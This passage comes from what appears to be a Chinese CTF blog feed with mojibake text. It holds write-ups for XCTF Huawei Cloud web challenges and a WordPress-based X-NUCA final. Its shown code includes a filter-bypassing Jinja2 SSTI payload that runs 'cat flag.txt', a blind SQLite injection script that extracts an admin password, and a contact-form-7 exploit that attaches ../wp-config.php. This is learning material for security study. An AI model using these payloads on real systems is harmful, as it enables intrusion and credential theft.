class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">cookies = &#123;<span class="string">&quot;JSESSIONID&quot;</span>: <span class="string">&quot;91329C00210DA235957175E32087F422&quot;</span>&#125;</span><br><span class="line">response = session.post(<span class="string">&quot;http://121.37.182.111:32201/upload.jsp&quot;</span>, data=paramsPost, headers=headers, cookies=cookies,</span><br><span class="line">                        proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">path = response.content.strip()</span><br><span class="line"><span class="built_in">print</span> path</span><br><span class="line"><span class="built_in">print</span> requests.get(<span class="string">&#x27;http://121.37.182.111:32201/&#x27;</span> + path).text</span><br></pre></td></tr></table></figure><h2 id="MIE1-1"><a href="#MIE1-1" class="headerlink" title="MIE1_1"></a>MIE1_1</h2><p><a href="https://www.secpulse.com/archives/115367.html">https://www.secpulse.com/archives/115367.html</a></p><p>è¿‡æ»¤äº†argsï¼Œç”¨cookieså°±å¥½äº†ã€‚</p><p><img src="/2020/12/21/2020-XCTF-huawei-cloud/-_Ziw3Hzu0cvoiNtpbRrOWNCEx24iltHK3GWDcPwR5OjDoY_LisT0UOngtZvrN0GxVXe7o55TyjCiGfkJxlA44mSJZ4YTcZ3ixjoBQMK_RKXnYQZNkBB5onM1XCaB0Mse9JTrrrH.png" alt="img"></p><h2 id="MIE2"><a href="#MIE2" class="headerlink" title="MIE2"></a>MIE2</h2><p>è¿‡æ»¤äº†<code>&#123;&#123;</code> ç©ºæ ¼ request set å¼•å· config ç­‰ã€‚</p><p>ä½¿ç”¨ <code>&#123;%</code>ï¼Œ%c æ¥æ‹¼å­—ç¬¦ä¸²ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://121.37.182.111:31969/success&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">s</span>):</span></span><br><span class="line">    res = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: (<span class="string">&#x27;&quot;%c&quot;%(&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(x)) + <span class="string">&quot;)&quot;</span>), s)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;+&quot;</span>.join(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp = <span class="string">&#x27;&#x27;&#x27;()|attr(&#123;x1&#125;)|attr(&#123;x2&#125;)|attr(&#123;x3&#125;)()|attr(&#123;x4&#125;)(233)|attr(&#123;x5&#125;)|attr(&#123;x6&#125;)|attr(&#123;x4&#125;)(&#123;x7&#125;)|attr(&#123;x4&#125;)(&#123;x8&#125;)(&#123;x9&#125;)&#x27;&#x27;&#x27;</span> \</span><br><span class="line">    .<span class="built_in">format</span>(</span><br><span class="line">    x1=gen(<span class="string">&quot;__class__&quot;</span>), x2=gen(<span class="string">&quot;__base__&quot;</span>), x3=gen(<span class="string">&quot;__subclasses__&quot;</span>), x4=gen(<span class="string">&quot;__getitem__&quot;</span>), x5=gen(<span class="string">&quot;__init__&quot;</span>),</span><br><span class="line">    x6=gen(<span class="string">&quot;__globals__&quot;</span>), x7=gen(<span class="string">&quot;__builtins__&quot;</span>), x8=gen(<span class="string">&quot;eval&quot;</span>),</span><br><span class="line">    x9=gen(<span class="string">&#x27;&#x27;&#x27;__import__(&quot;os&quot;).popen(&#x27;cat flag.txt&#x27;).read()&#x27;&#x27;&#x27;</span>))</span><br><span class="line">msg = <span class="string">&#x27;&#x27;&#x27;&#123;%print\n&#x27;&#x27;&#x27;</span> + exp + <span class="string">&quot;%&#125;&quot;</span></span><br><span class="line">s = requests.get(url, params=&#123;<span class="string">&#x27;msg&#x27;</span>: msg&#125;&#125;)</span><br><span class="line"><span class="built_in">print</span> s.text</span><br></pre></td></tr></table></figure><p><img src="/2020/12/21/2020-XCTF-huawei-cloud/BMv_rlYa235Q-QA3VCfQCYPFsIZRhPA1wDFCEUcITehBsbvK5qZ7efAztPmiGlbMaNqZziqZlcowK3cB_O4c5lzhwEradr9kNvjw-OLIIVC7sUMVT3w9nBr5L9Vz-SIXSzlHzxOQ.png" alt="img"></p><p>ç”¨ <code>\x</code>ç¼–ç çš„å½¢å¼åº”è¯¥ä¹Ÿå¯ä»¥ï¼Œç®€å•ä¸€äº›ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(()|attr(&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&quot;)()|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(202)|attr(&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(&quot;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(&quot;\x65\x76\x61\x6c&quot;)(&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x22\x6f\x73\x22\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74\x27\x29\x2e\x72\x65\x61\x64\x28\x29&quot;))%&#125;</span><br></pre></td></tr></table></figure><h2 id="PYER"><a href="#PYER" class="headerlink" title="PYER"></a>PYER</h2><p>username å¤„å­˜åœ¨æ³¨å…¥ï¼ŒSqliteï¼Œæ³¨å‡º admin çš„å¯†ç æ˜¯ <code>sqlite_not_safe</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://124.71.207.51:30435/login&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>(<span class="params">username, password</span>):</span></span><br><span class="line">    s = requests.post(url, data=&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;,proxies=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> s.status_code==<span class="number">500</span>:</span><br><span class="line">        <span class="built_in">print</span> username</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;login error&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> s.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># table:comment users</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_column</span>():</span></span><br><span class="line">    <span class="comment"># comment users</span></span><br><span class="line">    username = <span class="string">&quot;gml&#x27;union select case when substr((select hex(group_concat(sql)) FROM sqlite_master WHERE type=&#x27;table&#x27; and name=&#x27;users&#x27;),&#123;pos&#125;,1)=&#x27;&#123;value&#125;&#x27; then &#x27;2&#x27; else &#x27;0&#x27; end-- &quot;</span></span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>,<span class="number">500</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;0123456789ABCDEF&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> req(username.<span class="built_in">format</span>(pos=i,value=c), <span class="number">2</span>):</span><br><span class="line">                data += c</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(data)%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span> data.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pass</span>():</span></span><br><span class="line">    <span class="comment"># sqlite_not_safe</span></span><br><span class="line">    username = <span class="string">&quot;gml&#x27;union select case when substr((select hex(group_concat(password)) FROM users),&#123;pos&#125;,1)=&#x27;&#123;value&#125;&#x27; then &#x27;2&#x27; else &#x27;0&#x27; end-- &quot;</span></span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;0123456789ABCDEF&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> req(username.<span class="built_in">format</span>(pos=i,value=c), <span class="number">2</span>):</span><br><span class="line">                data += c</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(data)%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span> data.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>():</span></span><br><span class="line">    <span class="comment"># sqlite_not_safe</span></span><br><span class="line">    username = <span class="string">&quot;gml&#x27;union select case when substr((select hex(group_concat(sql)) FROM sqlite_master WHERE type=&#x27;table&#x27; and name=&#x27;comment&#x27;),&#123;pos&#125;,1)=&#x27;&#123;value&#125;&#x27; then &#x27;2&#x27; else &#x27;0&#x27; end-- &quot;</span></span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>,<span class="number">500</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;0123456789ABCDEF&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> req(username.<span class="built_in">format</span>(pos=i,value=c), <span class="number">2</span>):</span><br><span class="line">                data += c</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(data)%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span> data.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    username = <span class="string">&quot;gml&#x27;union select case when substr((select group_concat(tbl_name) FROM sqlite_master WHERE type=&#x27;table&#x27; and tbl_name NOT like &#x27;sqlite_%&#x27;),1,1)=&#x27;c&#x27; then &#x27;2&#x27; else &#x27;0&#x27; end-- &quot;</span></span><br><span class="line">    <span class="built_in">print</span> req(username, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># test()</span></span><br><span class="line">    <span class="comment"># get_column()</span></span><br><span class="line">    <span class="comment"># get_pass()</span></span><br><span class="line">    get_data()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç™»é™†è¿›adminï¼Œä¸€ä¸ªæŸ¥è¯¢ comment çš„åŠŸèƒ½ï¼Œæœ‰ä¸€å¤„æ³¨å…¥+å›æ˜¾ç‚¹ï¼Œå¯ä»¥sstiã€‚</p><p><img src="https://lh6.googleusercontent.com/rYXDKwGOrEhdBXZuCLvq2bErCvOI77f4rnVv16-hPAZhcHa2J0v0Q6_TW7gytpT4dh1fEBvFqsYqWO5WSyfP8UmQ4TzOTPuZy4U17L2Xp8o3_popz6hfjsf2WmgnuKJGFjAn8RbJ" alt="img"></p><p>ç›´æ¥æŠŠMIE2 é‚£ä¸ªé¢˜çš„payloadå¤ç”¨ä¸€ä¸‹ï¼š</p><p><img src="/2020/12/21/2020-XCTF-huawei-cloud/o-TOac5qa5vCGyWLa7jUZO2a8V6TNsOPk5lVVObwiksAEoavm-tXrgls39OF0u3hB-UUEa8PfrtCNA5NXmZRtST2odZ93QZ5NyYfHz_ihEI8990XbvehtRaQs6fyJsEik7yagWW8.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> huawei-cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 X-NUCA å†³èµ› ezwp</title>
      <link href="/2020/12/08/2020-X-NUCA-FINAL/"/>
      <url>/2020/12/08/2020-X-NUCA-FINAL/</url>
      
        <content type="html"><![CDATA[<p>å¾€å¹´å¬è¯´ X-NUCA å†³èµ›æœ‰æ¸—é€ï¼Œæƒ³ç€æ¥è¡¥è¡¥æ¸—é€ï¼Œç»“æœä»Šå¹´æ²¡æœ‰äº†â€¦ åªæœ‰ä¸€é“ Webï¼Œç±»ä¼¼è§£é¢˜ï¼Œæäº¤ flag æ¯è½®è‡ªåŠ¨å¾—åˆ†ï¼Œæ²¡æœ‰é˜²å¾¡æ¦‚å¿µã€‚</p><p>é¢˜ç›®åŸºäº Wordpress 5.5.3 æœ€æ–°ç‰ˆæœ¬è¿›è¡Œäº†ä¸€äº›æ”¹åŠ¨ï¼Œå¹¶æ·»åŠ äº†å‡ ä¸ªæ’ä»¶ã€‚æ‹¿åˆ°æºç å…ˆ diff ä¸€ä¸‹ï¼Œå‘ç° wordpress éƒ¨åˆ†æœ‰å‡ å¤„å°çš„æ”¹åŠ¨ï¼Œå…¶ä¸­å¢åŠ äº†å¯¹æ–‡ä»¶ä¸Šä¼ çš„ä¸€ä¸ªè¿‡æ»¤ï¼š</p><a id="more"></a><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209082627417.png" alt="image-20201209082627417"></p><p>æ–‡ä»¶å†…å®¹ä¸å…è®¸å«æœ‰ phpã€‚å…¶ä»–æœ‰éƒ¨åˆ†æ”¹åŠ¨ï¼Œä½†æ„Ÿè§‰æ²¡ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ã€‚ç»§ç»­çœ‹æ’ä»¶ï¼Œå‘ç°é™¤äº†contact-form-7ï¼Œå‰©ä¸‹çš„æ’ä»¶éƒ½æ˜¯æœ€æ–°ç‰ˆæœ¬ã€‚contact-form-7 æ˜¯ 5.0.3 çš„ç‰ˆæœ¬ã€‚</p><h2 id="é¢„æœŸè§£æ³•"><a href="#é¢„æœŸè§£æ³•" class="headerlink" title="é¢„æœŸè§£æ³•"></a>é¢„æœŸè§£æ³•</h2><p>å¼€å§‹ä¸€ç›´æ²¿ç€é¢„æœŸè§£æ³•åšï¼Œåé¢å¡ä½åšä¸åŠ¨äº†ã€‚</p><p>æœä¸€ä¸‹contact-form-7 5.0.3æ¼æ´ï¼Œå‘ç°æœ‰ä¸€ä¸ªæƒé™æå‡çš„æ¼æ´ï¼š<a href="https://paper.seebug.org/774/">https://paper.seebug.org/774/</a></p><p>diff ä¸€ä¸‹é¢˜ç›®çš„ä»£ç ä¸ contact-form-7 5.0.3æºç ï¼Œå‘ç°å¾ˆæ˜æ˜¾ï¼š</p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209082432162.png" alt="image-20201209082432162"></p><p>æƒé™æå‡çš„æ¼æ´æœ€ååˆ©ç”¨å°±æ˜¯é€šè¿‡é‚®ä»¶æ–¹å¼ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¿™é‡Œå‡ºé¢˜äººé‡å†™äº†å‘é‚®ä»¶å‡½æ•°ï¼Œå¾ˆæ˜æ˜¾å°±æ˜¯è¦åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚</p><p>ç”¨æ–‡ç« çš„æ–¹æ³•è¿›è¡Œå¤ç°ï¼Œå‘ç°å¯ä»¥è¶Šæƒåˆ›å»º contactï¼Œä½†æ˜¯æ— æ³•è®¾ç½® email é‚£äº›å…³é”®å‚æ•°ã€‚</p><p>æ–‡ç« çš„expï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> settings = &#123;</span><br><span class="line">    <span class="string">&quot;async&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;crossDomain&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://10.0.0.123/wordpress_v4.9.2/wp-admin/post.php?post=xxx&quot;</span>,</span><br><span class="line">    <span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;_wpnonce&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_wp_http_referer&quot;</span>: <span class="string">&quot;%2Fwordpress_v4.9.2%2Fwp-admin%2Fpost-new.php&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user_ID&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;post&quot;</span>,</span><br><span class="line">        <span class="string">&quot;originalaction&quot;</span>: <span class="string">&quot;editpost&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_author&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_type&quot;</span>: <span class="string">&quot;wpcf7_contact_form&quot;</span>,</span><br><span class="line">        <span class="string">&quot;original_post_status&quot;</span>: <span class="string">&quot;auto-draft&quot;</span>,</span><br><span class="line">        <span class="string">&quot;auto_draft&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_title&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">        <span class="string">&quot;content&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">        <span class="string">&quot;wp-preview&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hidden_post_status&quot;</span>: <span class="string">&quot;draft&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_status&quot;</span>: <span class="string">&quot;draft&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hidden_post_password&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hidden_post_visibility&quot;</span>: <span class="string">&quot;public&quot;</span>,</span><br><span class="line">        <span class="string">&quot;visibility&quot;</span>: <span class="string">&quot;public&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_password&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;mm&quot;</span>: <span class="string">&quot;12&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jj&quot;</span>: <span class="string">&quot;22&quot;</span>,</span><br><span class="line">        <span class="string">&quot;_thumbnail_id&quot;</span>: <span class="string">&quot;-1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;advanced_view&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;comment_status&quot;</span>: <span class="string">&quot;open&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ping_status&quot;</span>: <span class="string">&quot;open&quot;</span>,</span><br><span class="line">        <span class="string">&quot;post_name&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;meta_input[_mail][subject]&quot;</span>: <span class="string">&quot;test \&quot;[your-subject]\&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;meta_input[_mail][sender]&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;meta_input[_mail][recipient]&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">        <span class="string">&quot;meta_input[_mail][body]&quot;</span>: <span class="string">&quot;From: [your-name] &lt;[your-email]&gt;\\nSubject: [your-subject]\\n\\nMessage Body:\\n[your-message]\\n\\n-- \\n&quot;</span>,</span><br><span class="line">        <span class="string">&quot;meta_input[_mail][additional_headers]&quot;</span>: <span class="string">&quot;Reply-To: [your-email]&quot;</span>,</span><br><span class="line">        <span class="string">&quot;meta_input[_mail][attachments]&quot;</span>: <span class="string">&quot;../wp-config.php&quot;</span>,</span><br><span class="line">        <span class="string">&quot;meta_input[_mail][use_html]&quot;</span>: <span class="string">&quot;false&quot;</span>,</span><br><span class="line">        <span class="string">&quot;meta_input[_mail][exclude_blank]&quot;</span>: <span class="string">&quot;false&quot;</span>,</span><br><span class="line">        <span class="string">&quot;meta_input[_form]&quot;</span>: <span class="string">&quot;&lt;label&gt; Your Name (required)\n    [text* your-name] &lt;/label&gt;\n\n&lt;label&gt; Your Email (required)\n    [email* your-email] &lt;/label&gt;\n\n&lt;label&gt; Subject\n    [text your-subject] &lt;/label&gt;\n\n&lt;label&gt; Your Message\n    [textarea your-message] &lt;/label&gt;\n\n[submit \\\&quot;Send\\\&quot;]&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">jQuery.ajax(settings).done(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(response);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>expä¸­é€šè¿‡ <code>meta_input</code>å‚æ•°è®¾ç½®äº† email çš„ä¸€äº›å…³é”®å±æ€§ã€‚ä½†æ˜¯åœ¨æœ¬åœ°å¤ç°è¿‡ç¨‹ä¸­åªèƒ½åˆ›å»º contactï¼Œè¿™äº›å…³é”® meta æ²¡æœ‰è®¾ç½®æˆåŠŸã€‚</p><p>å¼€å¯è°ƒè¯•è·Ÿä¸€ä¸‹æºç ï¼Œå‘ç° meta_input å‚æ•°è¢« ban æ‰äº†â€¦</p><p><code>wp-admin/includes/post.php</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_wp_get_allowed_postdata</span>(<span class="params"> $post_data = <span class="literal">null</span> </span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">empty</span>( $post_data ) ) &#123;</span><br><span class="line">$post_data = $_POST;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Pass through errors.</span></span><br><span class="line"><span class="keyword">if</span> ( is_wp_error( $post_data ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> $post_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> array_diff_key( $post_data, array_flip( <span class="keyword">array</span>( <span class="string">&#x27;meta_input&#x27;</span>, <span class="string">&#x27;guid&#x27;</span> ) ) );</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨é‡Šä¸€ä¸‹è¿™ä¸ªè¿‡æ»¤ï¼Œå¯ä»¥çœ‹åˆ°æœ€ç»ˆç¡®å®æ˜¯å¯¹ meta_input å‚æ•°çš„å€¼è®¾ç½®äº† metaï¼š</p><p><code>wp-admin/includes/post.php</code>ï¼š</p><p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209084336190.png" alt="image-20201209084336190"></p><p>è¿™é‡Œå°è¯•äº†å¾ˆå¤šæ€è·¯å»ç»•è¿‡ï¼Œæ— æœï¼Œæ‰€ä»¥æ”¾å¼ƒäº†è¿™ä¸ªæ€è·¯â€¦</p><p>èµ›åé—®äº†ä¸‹å‡ºé¢˜å¸ˆå‚…ï¼Œç¡®å®æ˜¯åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚sendmail å‡½æ•°æœ‰å†™æ—¥å¿—çš„æ“ä½œï¼Œé¢„æœŸè§£æ˜¯å†™å…¥æ–‡ä»¶ï¼Œç„¶å phar ååºåˆ—åŒ– getshellï¼Œå…³äºè¿™ä¸ªæ¼æ´å¦‚ä½•åˆ©ç”¨ï¼Œæ²¡æœ‰å…¬å¸ƒã€‚</p><h2 id="éé¢„æœŸè§£æ³•"><a href="#éé¢„æœŸè§£æ³•" class="headerlink" title="éé¢„æœŸè§£æ³•"></a>éé¢„æœŸè§£æ³•</h2><p>å‡ºé¢˜äººåœ¨æ–‡ä»¶ä¸Šä¼ å¤„åŠ äº†è¿‡æ»¤ï¼Œä¸å…è®¸å«æœ‰ phpï¼Œæ‰€ä»¥éœ€è¦åˆ©ç”¨ä¸Šè¿°æ¼æ´è¾¾åˆ°ä»»æ„æ–‡ä»¶å†™çš„ç›®çš„ã€‚ä½†æ˜¯èµ›åœºä¸Šå¤§å®¶å‡ ä¹éƒ½æ˜¯éé¢„æœŸã€‚</p><img src="/2020/12/08/2020-X-NUCA-FINAL/image-20201209085131068.png" alt="image-20201209085131068" style="zoom: 50%;"><p>å°† php éšä¾¿æ”¹æˆ  xxxï¼Œphar ååºåˆ—åŒ–åŒæ ·å¯ä»¥åˆ©ç”¨ã€‚</p><p>ä¸‹é¢å°±æ˜¯ç›¸åŒçš„æ€è·¯äº†ï¼Œååºåˆ—åŒ– getshellï¼Œå‚è€ƒè¿™ç¯‡ phar çš„ç»å…¸æ–‡ç« ï¼š<a href="https://paper.seebug.org/680/#31">https://paper.seebug.org/680/#31</a></p><p>pop é“¾ï¼Œæ²¡æœ‰äº† WooCommerce è¿™ä¸ªæ’ä»¶ï¼Œæ‰¾ä¸€ä¸ªä»£æ›¿çš„ï¼š</p><p> all-in-one-event-calendar æ’ä»¶ä¸­ <code>app/controller/shutdown.php</code>çš„<code>Ai1ec_Shutdown_Controller</code>ç±»ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 